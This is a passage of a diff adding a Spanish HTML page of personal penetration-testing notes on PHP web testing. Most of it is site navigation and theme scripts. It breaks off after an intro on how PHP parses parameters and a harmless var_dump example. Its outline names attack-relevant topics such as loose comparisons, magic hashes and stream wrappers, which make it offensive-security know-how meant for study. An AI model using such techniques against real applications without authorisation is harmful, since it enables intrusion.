@@ -1,0 +1,814 @@
+<!DOCTYPE html><html lang="es" data-theme="dful-dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><script>
+      (() => {
+        const storageKey = 'dful-theme';
+        const schemaKey = 'dful-theme-schema';
+        const schemaVersion = '2';
+        const legacyStorageKey = 'dful-theme-preview';
+        const valid = new Set(["dful-dark","amber-dark","dful-light","flexoki-paper","phosphor","arcade","cobalt"]);
+        const dark = new Set(["dful-dark","amber-dark","phosphor","arcade","cobalt"]);
+        const fallback = "dful-dark";
+        let theme = fallback;
+        try {
+          const needsMigration = localStorage.getItem(schemaKey) !== schemaVersion;
+          let stored = localStorage.getItem(storageKey);
+          if (needsMigration) {
+            if (stored === 'graphite') stored = 'dful-dark';
+            else if (stored === 'dful-dark') stored = 'amber-dark';
+            localStorage.setItem(schemaKey, schemaVersion);
+            if (stored) localStorage.setItem(storageKey, stored);
+          }
+          if (valid.has(stored)) theme = stored;
+          else {
+            let legacy = localStorage.getItem(legacyStorageKey);
+            if (needsMigration) {
+              if (legacy === 'graphite') legacy = 'dful-dark';
+              else if (legacy === 'dful-dark') legacy = 'amber-dark';
+            }
+            if (valid.has(legacy)) {
+              theme = legacy;
+              localStorage.setItem(storageKey, legacy);
+            }
+            if (legacy) localStorage.removeItem(legacyStorageKey);
+          }
+          localStorage.setItem(storageKey, theme);
+        } catch {}
+        document.documentElement.dataset.theme = theme;
+        document.documentElement.style.colorScheme = dark.has(theme) ? 'dark' : 'light';
+      })();</script><meta name="description" content="Comportamientos específicos de PHP sobre parsing de parámetros, comparaciones laxas, evaluación dinámica y stream wrappers útiles durante pruebas web."><link rel="canonical" href="https://dful.github.io/es/notes/pruebas-web-php/"><link rel="alternate" hreflang="es" href="https://dful.github.io/es/notes/pruebas-web-php/"><link rel="alternate" hreflang="en" href="https://dful.github.io/en/notes/php-web-testing/"><link rel="alternate" hreflang="x-default" href="https://dful.github.io/en/notes/php-web-testing/"><meta property="og:url" content="https://dful.github.io/es/notes/pruebas-web-php/"><meta property="og:type" content="website"><meta property="og:site_name" content="dful"><meta property="og:title" content="PHP Web Testing · dful"><meta property="og:description" content="Comportamientos específicos de PHP sobre parsing de parámetros, comparaciones laxas, evaluación dinámica y stream wrappers útiles durante pruebas web."><meta property="og:locale" content="es_ES"><meta property="og:locale:alternate" content="en_GB"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="PHP Web Testing · dful"><meta name="twitter:description" content="Comportamientos específicos de PHP sobre parsing de parámetros, comparaciones laxas, evaluación dinámica y stream wrappers útiles durante pruebas web."><meta name="generator" content="Astro v7.3.2"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><title>PHP Web Testing · dful</title><link rel="stylesheet" href="/_astro/notes.DkEzeG-w.css"><link rel="stylesheet" href="/_astro/BaseLayout.l85KjHsw.css"><link rel="stylesheet" href="/_astro/publishing.C5o61NTe.css"></head><body><a class="skip-link" href="#main">Saltar al contenido</a><header class="site-header"><div class="header-inner"><a class="wordmark" href="/es/" aria-label="dful · Inicio">dful<span>.</span></a><nav class="primary-nav" aria-label="Principal"><a href="/es/" data-active="false">Inicio</a><a href="/es/notes/" data-active="true" aria-current="page">Notas</a><a href="/es/research/" data-active="false">Artículos</a><a href="/es/about/" data-active="false">About</a></nav><div class="header-actions"><details class="theme-picker" data-theme-picker data-astro-cid-hcqnpaxe><summary aria-label="Tema" data-astro-cid-hcqnpaxe><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M12 3.25a8.75 8.75 0 1 0 0 17.5h1.25a2.25 2.25 0 0 0 0-4.5h-.75a1.75 1.75 0 0 1 0-3.5h2.35A5.9 5.9 0 0 0 20.75 6.9C18.72 4.63 15.72 3.25 12 3.25Z"></path><circle cx="7.4" cy="10" r=".7" fill="currentColor" stroke="none"></circle><circle cx="9.25" cy="6.9" r=".7" fill="currentColor" stroke="none"></circle><circle cx="13" cy="6.2" r=".7" fill="currentColor" stroke="none"></circle><circle cx="16.25" cy="8" r=".7" fill="currentColor" stroke="none"></circle></svg><span class="theme-current" data-theme-current data-astro-cid-hcqnpaxe>Dful Dark</span></summary><div class="theme-menu" aria-label="Tema" data-astro-cid-hcqnpaxe><div class="theme-menu-head" data-astro-cid-hcqnpaxe>Tema</div><button type="button" aria-pressed="true" data-theme-option="dful-dark" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#111214" data-astro-cid-hcqnpaxe></i><i style="--swatch:#f0eee8" data-astro-cid-hcqnpaxe></i><i style="--swatch:#ff8b3d" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Dful Dark</span></button><button type="button" aria-pressed="false" data-theme-option="amber-dark" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#0c0c0b" data-astro-cid-hcqnpaxe></i><i style="--swatch:#f2efe7" data-astro-cid-hcqnpaxe></i><i style="--swatch:#ff9f2f" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Amber Dark</span></button><button type="button" aria-pressed="false" data-theme-option="dful-light" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#f7f3ea" data-astro-cid-hcqnpaxe></i><i style="--swatch:#171511" data-astro-cid-hcqnpaxe></i><i style="--swatch:#b94d08" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Dful Light</span></button><button type="button" aria-pressed="false" data-theme-option="flexoki-paper" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#fffcf0" data-astro-cid-hcqnpaxe></i><i style="--swatch:#100f0f" data-astro-cid-hcqnpaxe></i><i style="--swatch:#bc5215" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Flexoki Paper</span></button><button type="button" aria-pressed="false" data-theme-option="phosphor" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#030604" data-astro-cid-hcqnpaxe></i><i style="--swatch:#c8f7cf" data-astro-cid-hcqnpaxe></i><i style="--swatch:#48ff78" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Phosphor</span></button><button type="button" aria-pressed="false" data-theme-option="arcade" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#11102b" data-astro-cid-hcqnpaxe></i><i style="--swatch:#fff4d7" data-astro-cid-hcqnpaxe></i><i style="--swatch:#4de9ff" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Arcade</span></button><button type="button" aria-pressed="false" data-theme-option="cobalt" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#07111f" data-astro-cid-hcqnpaxe></i><i style="--swatch:#edf6ff" data-astro-cid-hcqnpaxe></i><i style="--swatch:#42b9ff" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Cobalt</span></button></div></details><script>
+  (() => {
+    const storageKey = 'dful-theme';
+    const themes = [{"id":"dful-dark","name":"Dful Dark","colorScheme":"dark"},{"id":"amber-dark","name":"Amber Dark","colorScheme":"dark"},{"id":"dful-light","name":"Dful Light","colorScheme":"light"},{"id":"flexoki-paper","name":"Flexoki Paper","colorScheme":"light"},{"id":"phosphor","name":"Phosphor","colorScheme":"dark"},{"id":"arcade","name":"Arcade","colorScheme":"dark"},{"id":"cobalt","name":"Cobalt","colorScheme":"dark"}];
+    const valid = new Set(themes.map(({ id }) => id));
+    const names = Object.fromEntries(themes.map(({ id, name }) => [id, name]));
+    const isDark = (theme) => themes.find((item) => item.id === theme)?.colorScheme === 'dark';
+    const apply = (theme) => {
+      const selected = valid.has(theme) ? theme : "dful-dark";
+      document.documentElement.dataset.theme = selected;
+      document.documentElement.style.colorScheme = isDark(selected) ? 'dark' : 'light';
+      try { localStorage.setItem(storageKey, selected); } catch {}
+      document.querySelectorAll('[data-theme-picker]').forEach((picker) => {
+        const current = picker.querySelector('[data-theme-current]');
+        if (current) current.textContent = names[selected];
+        picker.querySelectorAll('[data-theme-option]').forEach((button) => button.setAttribute('aria-pressed', button.getAttribute('data-theme-option') === selected ? 'true' : 'false'));
+      });
+    };
+    const enhance = () => {
+      document.querySelectorAll('[data-theme-picker]:not([data-enhanced])').forEach((picker) => {
+        picker.setAttribute('data-enhanced','true');
+        picker.addEventListener('keydown', (event) => {
+          if (event.key === 'Escape' && picker.open) {
+            picker.removeAttribute('open');
+            picker.querySelector('summary').focus();
+          }
+        });
+        picker.querySelectorAll('[data-theme-option]').forEach((button) => button.addEventListener('click', () => {
+          apply(button.getAttribute('data-theme-option'));
+          picker.removeAttribute('open');
+          picker.querySelector('summary').focus();
+        }));
+      });
+      let stored = "dful-dark";
+      try { stored = localStorage.getItem(storageKey) || stored; } catch {}
+      apply(stored);
+    };
+    enhance();
+    document.addEventListener('astro:page-load', enhance);
+  })();</script><nav class="lang-switch" aria-label="Cambiar idioma"><a href="/en/notes/php-web-testing/" data-active="false">EN</a><a href="/es/notes/pruebas-web-php/" data-active="true" aria-current="page">ES</a></nav><div class="social-links" aria-label="Perfiles sociales"><a href="https://github.com/dful" rel="me">GitHub</a><a href="https://www.linkedin.com/in/daniel-fulladosa/" rel="me">LinkedIn</a></div></div></div></header><main id="main"><div class="notes-page" data-note-slug="pruebas-web-php"><div class="notes-shell"><aside class="notes-tree" aria-label="Árbol de conocimiento"><div class="notes-side-head"><strong>Árbol de conocimiento</strong></div><script>
+  (() => { document.documentElement.setAttribute('data-notes-tree-pending', 'true'); })();
+</script><ul class="knowledge-tree" data-notes-tree data-notes-tree-locale="es"><li data-depth="0" data-node-type="category" data-tree-key="domain:ai" data-active-path="false"><details open><summary><span class="tree-category-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="12" r="2.5"></circle><circle cx="5" cy="6" r="1.75"></circle><circle cx="19" cy="6" r="1.75"></circle><circle cx="12" cy="20" r="1.75"></circle><path d="m10.2 10.4-3.8-3.2m7.4 3.2 3.8-3.2M12 14.5v3.75"></path></svg></span><span>AI</span></summary><ul><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:fundamentals" data-active-path="false"><details><summary><span>Fundamentos</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:tokens-y-contexto" data-active-path="false"><a href="/es/notes/tokens-y-contexto/"><span>Tokens y contexto</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:inferencia" data-active-path="false"><a href="/es/notes/inferencia/"><span>Inferencia</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:razonamiento" data-active-path="false"><a href="/es/notes/razonamiento/"><span>Razonamiento</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:ingenieria-contexto" data-active-path="false"><a href="/es/notes/ingenieria-contexto/"><span>Ingeniería de contexto</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:agents" data-active-path="false"><details><summary><span>Agentes</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:bucle-agente" data-active-path="false"><a href="/es/notes/bucle-agente/"><span>Bucle de agente</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:harness-agente" data-active-path="false"><a href="/es/notes/harness-agente/"><span>Harness de agente</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:uso-herramientas" data-active-path="false"><a href="/es/notes/uso-herramientas/"><span>Uso de herramientas</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:subagentes" data-active-path="false"><a href="/es/notes/subagentes/"><span>Subagentes</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:security" data-active-path="false"><details><summary><span>Seguridad</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:inyeccion-de-prompts" data-active-path="false"><a href="/es/notes/inyeccion-de-prompts/"><span>Prompt Injection</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:permisos-de-agentes" data-active-path="false"><a href="/es/notes/permisos-de-agentes/"><span>Permisos de agentes</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:sandboxing-y-egress" data-active-path="false"><a href="/es/notes/sandboxing-y-egress/"><span>Sandboxing y egress</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:applied-ai" data-active-path="false"><details><summary><span>IA aplicada</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:apis-modelos" data-active-path="false"><a href="/es/notes/apis-modelos/"><span>APIs de modelos</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:costes-api" data-active-path="false"><a href="/es/notes/costes-api/"><span>Costes de API</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:modelos-despliegue" data-active-path="false"><a href="/es/notes/modelos-despliegue/"><span>Modelos de despliegue</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:inferencia-local" data-active-path="false"><a href="/es/notes/inferencia-local/"><span>Inferencia local</span></a></li></ul></details></li></ul></details></li><li data-depth="0" data-node-type="category" data-tree-key="domain:offensive-security" data-active-path="true"><details open><summary><span class="tree-category-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M12 2.75 19 5.4v5.45c0 4.65-2.8 8.15-7 10.4-4.2-2.25-7-5.75-7-10.4V5.4L12 2.75Z"></path><path d="m9 12 2 2 4-4"></path></svg></span><span>Seguridad ofensiva</span></summary><ul><li data-depth="1" data-node-type="category" data-tree-key="category:domain:offensive-security:shells" data-active-path="false"><details><summary><span>Shells</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:acceso-remoto" data-active-path="false"><a href="/es/notes/acceso-remoto/"><span>Acceso remoto</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:offensive-security:file-transfer" data-active-path="false"><details><summary><span>Transferencia de archivos</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:transferencias-de-archivos-en-windows" data-active-path="false"><a href="/es/notes/transferencias-de-archivos-en-windows/"><span>Transferencias de archivos en Windows</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:transferencias-de-archivos-en-linux" data-active-path="false"><a href="/es/notes/transferencias-de-archivos-en-linux/"><span>Transferencias de archivos en Linux</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:offensive-security:web-applications" data-active-path="true"><details open><summary><span>Aplicaciones web</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:pruebas-web-php" data-active-path="true"><a href="/es/notes/pruebas-web-php/" aria-current="page"><span>PHP Web Testing</span></a></li></ul></details></li></ul></details></li></ul><script>
+  (() => {
+    if (globalThis.__dfulNotesTreeState) return;
+    globalThis.__dfulNotesTreeState = true;
+    const storagePrefix = 'dful-notes-tree:v1:';
+    let syncing = false;
+    const ignoredToggles = new WeakSet();
+
+    const trees = () => [...document.querySelectorAll('[data-notes-tree]')];
+    const details = () => trees().flatMap((tree) => [...tree.querySelectorAll('[data-tree-key] > details')]);
+    const keyFor = (detail) => detail.parentElement?.getAttribute('data-tree-key');
+    const activePath = (detail) => detail.parentElement?.getAttribute('data-active-path') === 'true';
+    const localeFor = () => document.querySelector('[data-notes-tree-locale]')?.getAttribute('data-notes-tree-locale') || 'en';
+    const storageKey = () => `${storagePrefix}${localeFor()}`;
+
+    const readState = () => {
+      try {
+        const parsed = JSON.parse(localStorage.getItem(storageKey()) || '{}');
+        return parsed && typeof parsed === 'object' ? parsed : {};
+      } catch {
+        return {};
+      }
+    };
+
+    const writeState = (state) => {
+      try { localStorage.setItem(storageKey(), JSON.stringify(state)); } catch {}
+    };
+
+    const syncKey = (key, open) => {
+      syncing = true;
+      details().filter((detail) => keyFor(detail) === key).forEach((detail) => {
+        if (detail.open === open) return;
+        ignoredToggles.add(detail);
+        detail.open = open;
+      });
+      syncing = false;
+    };
+
+    const applyState = () => {
+      const state = readState();
+      syncing = true;
+      details().forEach((detail) => {
+        const key = keyFor(detail);
+        if (!key) return;
+        const item = detail.parentElement;
+        const defaultOpen = item?.getAttribute('data-depth') === '0';
+        detail.open = activePath(detail) || (typeof state[key] === 'boolean' ? state[key] : defaultOpen);
+      });
+      syncing = false;
+    };
+
+    const enhance = () => {
+      if (!trees().length) {
+        document.documentElement.removeAttribute('data-notes-tree-pending');
+        return;
+      }
+      try {
+        applyState();
+      } finally {
+        document.documentElement.removeAttribute('data-notes-tree-pending');
+      }
+      details().filter((detail) => !detail.hasAttribute('data-tree-state-bound')).forEach((detail) => {
+        detail.setAttribute('data-tree-state-bound', 'true');
+        detail.addEventListener('toggle', () => {
+          if (ignoredToggles.delete(detail)) return;
+          if (syncing) return;
+          const key = keyFor(detail);
+          if (!key) return;
+          if (activePath(detail) && !detail.open) {
+            const state = readState();
+            state[key] = false;
+            writeState(state);
+            syncKey(key, true);
+            return;
+          }
+          const state = readState();
+          state[key] = detail.open;
+          writeState(state);
+          syncKey(key, detail.open);
+        });
+      });
+    };
+
+    document.addEventListener('astro:page-load', enhance);
+    if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', enhance, { once:true });
+    else enhance();
+  })();
+</script></aside><div class="notes-detail-shell"><article class="notes-article"><div class="notes-mobile-nav"><details><summary>Árbol de conocimiento</summary><div><script>
+  (() => { document.documentElement.setAttribute('data-notes-tree-pending', 'true'); })();
+</script><ul class="knowledge-tree" data-notes-tree data-notes-tree-locale="es"><li data-depth="0" data-node-type="category" data-tree-key="domain:ai" data-active-path="false"><details open><summary><span class="tree-category-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="12" r="2.5"></circle><circle cx="5" cy="6" r="1.75"></circle><circle cx="19" cy="6" r="1.75"></circle><circle cx="12" cy="20" r="1.75"></circle><path d="m10.2 10.4-3.8-3.2m7.4 3.2 3.8-3.2M12 14.5v3.75"></path></svg></span><span>AI</span></summary><ul><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:fundamentals" data-active-path="false"><details><summary><span>Fundamentos</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:tokens-y-contexto" data-active-path="false"><a href="/es/notes/tokens-y-contexto/"><span>Tokens y contexto</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:inferencia" data-active-path="false"><a href="/es/notes/inferencia/"><span>Inferencia</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:razonamiento" data-active-path="false"><a href="/es/notes/razonamiento/"><span>Razonamiento</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:ingenieria-contexto" data-active-path="false"><a href="/es/notes/ingenieria-contexto/"><span>Ingeniería de contexto</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:agents" data-active-path="false"><details><summary><span>Agentes</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:bucle-agente" data-active-path="false"><a href="/es/notes/bucle-agente/"><span>Bucle de agente</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:harness-agente" data-active-path="false"><a href="/es/notes/harness-agente/"><span>Harness de agente</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:uso-herramientas" data-active-path="false"><a href="/es/notes/uso-herramientas/"><span>Uso de herramientas</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:subagentes" data-active-path="false"><a href="/es/notes/subagentes/"><span>Subagentes</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:security" data-active-path="false"><details><summary><span>Seguridad</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:inyeccion-de-prompts" data-active-path="false"><a href="/es/notes/inyeccion-de-prompts/"><span>Prompt Injection</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:permisos-de-agentes" data-active-path="false"><a href="/es/notes/permisos-de-agentes/"><span>Permisos de agentes</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:sandboxing-y-egress" data-active-path="false"><a href="/es/notes/sandboxing-y-egress/"><span>Sandboxing y egress</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:applied-ai" data-active-path="false"><details><summary><span>IA aplicada</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:apis-modelos" data-active-path="false"><a href="/es/notes/apis-modelos/"><span>APIs de modelos</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:costes-api" data-active-path="false"><a href="/es/notes/costes-api/"><span>Costes de API</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:modelos-despliegue" data-active-path="false"><a href="/es/notes/modelos-despliegue/"><span>Modelos de despliegue</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:inferencia-local" data-active-path="false"><a href="/es/notes/inferencia-local/"><span>Inferencia local</span></a></li></ul></details></li></ul></details></li><li data-depth="0" data-node-type="category" data-tree-key="domain:offensive-security" data-active-path="true"><details open><summary><span class="tree-category-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M12 2.75 19 5.4v5.45c0 4.65-2.8 8.15-7 10.4-4.2-2.25-7-5.75-7-10.4V5.4L12 2.75Z"></path><path d="m9 12 2 2 4-4"></path></svg></span><span>Seguridad ofensiva</span></summary><ul><li data-depth="1" data-node-type="category" data-tree-key="category:domain:offensive-security:shells" data-active-path="false"><details><summary><span>Shells</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:acceso-remoto" data-active-path="false"><a href="/es/notes/acceso-remoto/"><span>Acceso remoto</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:offensive-security:file-transfer" data-active-path="false"><details><summary><span>Transferencia de archivos</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:transferencias-de-archivos-en-windows" data-active-path="false"><a href="/es/notes/transferencias-de-archivos-en-windows/"><span>Transferencias de archivos en Windows</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:transferencias-de-archivos-en-linux" data-active-path="false"><a href="/es/notes/transferencias-de-archivos-en-linux/"><span>Transferencias de archivos en Linux</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:offensive-security:web-applications" data-active-path="true"><details open><summary><span>Aplicaciones web</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:pruebas-web-php" data-active-path="true"><a href="/es/notes/pruebas-web-php/" aria-current="page"><span>PHP Web Testing</span></a></li></ul></details></li></ul></details></li></ul><script>
+  (() => {
+    if (globalThis.__dfulNotesTreeState) return;
+    globalThis.__dfulNotesTreeState = true;
+    const storagePrefix = 'dful-notes-tree:v1:';
+    let syncing = false;
+    const ignoredToggles = new WeakSet();
+
+    const trees = () => [...document.querySelectorAll('[data-notes-tree]')];
+    const details = () => trees().flatMap((tree) => [...tree.querySelectorAll('[data-tree-key] > details')]);
+    const keyFor = (detail) => detail.parentElement?.getAttribute('data-tree-key');
+    const activePath = (detail) => detail.parentElement?.getAttribute('data-active-path') === 'true';
+    const localeFor = () => document.querySelector('[data-notes-tree-locale]')?.getAttribute('data-notes-tree-locale') || 'en';
+    const storageKey = () => `${storagePrefix}${localeFor()}`;
+
+    const readState = () => {
+      try {
+        const parsed = JSON.parse(localStorage.getItem(storageKey()) || '{}');
+        return parsed && typeof parsed === 'object' ? parsed : {};
+      } catch {
+        return {};
+      }
+    };
+
+    const writeState = (state) => {
+      try { localStorage.setItem(storageKey(), JSON.stringify(state)); } catch {}
+    };
+
+    const syncKey = (key, open) => {
+      syncing = true;
+      details().filter((detail) => keyFor(detail) === key).forEach((detail) => {
+        if (detail.open === open) return;
+        ignoredToggles.add(detail);
+        detail.open = open;
+      });
+      syncing = false;
+    };
+
+    const applyState = () => {
+      const state = readState();
+      syncing = true;
+      details().forEach((detail) => {
+        const key = keyFor(detail);
+        if (!key) return;
+        const item = detail.parentElement;
+        const defaultOpen = item?.getAttribute('data-depth') === '0';
+        detail.open = activePath(detail) || (typeof state[key] === 'boolean' ? state[key] : defaultOpen);
+      });
+      syncing = false;
+    };
+
+    const enhance = () => {
+      if (!trees().length) {
+        document.documentElement.removeAttribute('data-notes-tree-pending');
+        return;
+      }
+      try {
+        applyState();
+      } finally {
+        document.documentElement.removeAttribute('data-notes-tree-pending');
+      }
+      details().filter((detail) => !detail.hasAttribute('data-tree-state-bound')).forEach((detail) => {
+        detail.setAttribute('data-tree-state-bound', 'true');
+        detail.addEventListener('toggle', () => {
+          if (ignoredToggles.delete(detail)) return;
+          if (syncing) return;
+          const key = keyFor(detail);
+          if (!key) return;
+          if (activePath(detail) && !detail.open) {
+            const state = readState();
+            state[key] = false;
+            writeState(state);
+            syncKey(key, true);
+            return;
+          }
+          const state = readState();
+          state[key] = detail.open;
+          writeState(state);
+          syncKey(key, detail.open);
+        });
+      });
+    };
+
+    document.addEventListener('astro:page-load', enhance);
+    if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', enhance, { once:true });
+    else enhance();
+  })();
+</script></div></details><details><summary>En esta página</summary><div><ul><li data-depth="2"><a href="#parsing-de-parámetros">Parsing de parámetros</a></li><li data-depth="3"><a href="#scalars-y-arrays">Scalars y arrays</a></li><li data-depth="3"><a href="#parámetros-duplicados-y-colisiones-scalar-array">Parámetros duplicados y colisiones scalar-array</a></li><li data-depth="3"><a href="#normalización-de-nombres-de-parámetros">Normalización de nombres de parámetros</a></li><li data-depth="3"><a href="#precedencia-de-_request">Precedencia de $_REQUEST</a></li><li data-depth="2"><a href="#comparaciones-laxas">Comparaciones laxas</a></li><li data-depth="3"><a href="#strings-numéricos-y-magic-hashes">Strings numéricos y magic hashes</a></li><li data-depth="3"><a href="#comprobaciones-laxas-de-pertenencia">Comprobaciones laxas de pertenencia</a></li><li data-depth="3"><a href="#valores-falsey-y-valores-centinela">Valores falsey y valores centinela</a></li><li data-depth="2"><a href="#evaluación-dinámica">Evaluación dinámica</a></li><li data-depth="3"><a href="#contexto-del-código-generado">Contexto del código generado</a></li><li data-depth="3"><a href="#addslashes-e-interpolación-de-strings">addslashes() e interpolación de strings</a></li><li data-depth="2"><a href="#wrappers-de-streams">Wrappers de streams</a></li><li data-depth="3"><a href="#phpfilter">php://filter</a></li><li data-depth="3"><a href="#phpinput">php://input</a></li><li data-depth="3"><a href="#data">data://</a></li><li data-depth="3"><a href="#phar">phar://</a></li><li data-depth="2"><a href="#referencias">Referencias</a></li></ul></div></details></div><header class="notes-header"><div class="notes-header-pretitle"><nav class="notes-breadcrumb" aria-label="Migas de pan"><span>Seguridad ofensiva</span><i aria-hidden="true">/</i><span>Aplicaciones web</span></nav></div><h1>PHP Web Testing</h1><div class="notes-deck">Comportamientos específicos de PHP sobre parsing de parámetros, comparaciones laxas, evaluación dinámica y stream wrappers útiles durante pruebas web.</div><small>Actualizado 25 ago 2026</small></header><div class="publishing-prose"><p>Identificar PHP en una aplicación añade probes que dependen del runtime y de cómo PHP transforma los datos antes de que lleguen a la lógica de la aplicación. El parser de parámetros puede convertir un valor HTTP en un array, distintos nombres pueden terminar en la misma key, una comparación laxa puede cambiar según los tipos recibidos y un path controlable puede resolverse mediante un stream wrapper en lugar de como un fichero local.</p>
+<p>Estos comportamientos son especialmente útiles con acceso al código, aunque muchos también pueden detectarse desde black-box comparando requests que sólo cambian en la representación del input.</p>
+<h2 id="parsing-de-parámetros">Parsing de parámetros</h2>
+<p>Los valores recibidos mediante GET o formularios llegan normalmente a PHP como strings. El nombre del parámetro, sin embargo, puede construir arrays y estructuras anidadas.</p>
+<h3 id="scalars-y-arrays">Scalars y arrays</h3>
+<p>Un endpoint mínimo:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#FF7B72">&#x3C;?</span><span style="color:#79C0FF">php</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79C0FF">var_dump</span><span style="color:#E6EDF3">($_GET[</span><span style="color:#A5D6FF">'role'</span><span style="color:#E6EDF3">] </span><span style="color:#FF7B72">??</span><span style="color:#79C0FF"> null</span><span style="color:#E6EDF3">);</span></span></code></pre>
+<p>recibe un scalar con:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="http"><code><span class="line"><span style="color:#FF7B72">GET</span><span style="color:#E6EDF3"> /?role=admin </span><span style="color:#FF7B72">HTTP</span><span style="color:#E6EDF3">/</span><span style="color:#79C0FF">1.1</span></span>
+<span class="line"><span style="color:#7EE787">Host</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> target</span></span></code></pre>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>string(5) "admin"</span></span></code></pre>
+<p>La bracket notation cambia el tipo recibido:</p>
